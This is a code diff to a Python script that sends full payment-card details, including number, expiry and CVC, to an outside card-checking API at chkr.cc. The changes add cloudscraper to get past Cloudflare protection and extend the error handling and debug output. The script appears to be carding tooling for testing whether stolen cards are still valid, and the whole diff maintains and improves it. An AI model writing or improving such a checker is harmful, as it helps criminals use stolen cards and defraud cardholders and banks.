@@ -4,6 +4,7 @@ import random
 import time
 import string
 import base64
+import cloudscraper
 from bs4 import BeautifulSoup
 
 def Tele(ccx):
@@ -12,7 +13,7 @@ def Tele(ccx):
     try:
         n, mm, yy, cvc = ccx.split("|")
     except ValueError:
-        print(f"Error: Invalid CC format -> {ccx}")
+        print(f"❌ Error: Invalid CC format -> {ccx}")
         return "Invalid Input Format"
 
     if yy.startswith("20"):
@@ -30,25 +31,27 @@ def Tele(ccx):
 
     params = {
         'data': f'{n}|{mm}|20{yy}|{cvc}',
-        'key': '',
+        'key': 'YOUR_API_KEY',  # Add a valid API key if required
     }
 
     try:
-        response = requests.get('https://chkr.cc/api.php', headers=headers, params=params)
+        scraper = cloudscraper.create_scraper()
+        response = scraper.get('https://chkr.cc/api.php', headers=headers, params=params)
 
         # ✅ Debugging: Print Response
-        print(f"\n🔹 Response Status: {response.status_code}")
+        print(f"\n🔹 Request Sent To: {response.url}")
+        print(f"🔹 Response Status: {response.status_code}")
         print(f"🔹 Response Headers: {response.headers}")
         print(f"🔹 Response Text: {response.text}\n")
 
-        if response.status_code == 405:
-            return "❌ Method Not Allowed - Try a Different Request Type"
+        if response.status_code != 200:
+            return f"❌ HTTP Error {response.status_code}"
 
         if not response.text.strip():
             return "❌ Empty Response from Server"
 
         if "<html" in response.text.lower():
-            return "❌ Received HTML Page instead of JSON"
+            return "❌ Received HTML Page instead of JSON (Check API Endpoint)"
 
         try:
             response_json = response.json()
@@ -66,7 +69,7 @@ def Tele1(ccx):
     try:
         n, mm, yy, cvc = ccx.split("|")
     except ValueError:
-        print(f"Error: Invalid CC format -> {ccx}")
+        print(f"❌ Error: Invalid CC format -> {ccx}")
         return "Invalid Input Format"
 
     if yy.startswith("20"):
@@ -84,25 +87,27 @@ def Tele1(ccx):
 
     params = {
         'data': f'{n}|{mm}|20{yy}|{cvc}',
-        'key': '',
+        'key': 'YOUR_API_KEY',  # Add a valid API key if required
     }
 
     try:
-        response = requests.get('https://chkr.cc/api.php', headers=headers, params=params)
+        scraper = cloudscraper.create_scraper()
+        response = scraper.get('https://chkr.cc/api.php', headers=headers, params=params)
 
         # ✅ Debugging: Print Response
-        print(f"\n🔹 Response Status: {response.status_code}")
+        print(f"\n🔹 Request Sent To: {response.url}")
+        print(f"🔹 Response Status: {response.status_code}")
         print(f"🔹 Response Headers: {response.headers}")
         print(f"🔹 Response Text: {response.text}\n")
 
-        if response.status_code == 405:
-            return "❌ Method Not Allowed - Try a Different Request Type"
+        if response.status_code != 200:
+            return f"❌ HTTP Error {response.status_code}"
 
         if not response.text.strip():
             return "❌ Empty Response from Server"
 
         if "<html" in response.text.lower():
-            return "❌ Received HTML Page instead of JSON"
+            return "❌ Received HTML Page instead of JSON (Check API Endpoint)"
 
         try:
             response_json = response.json()
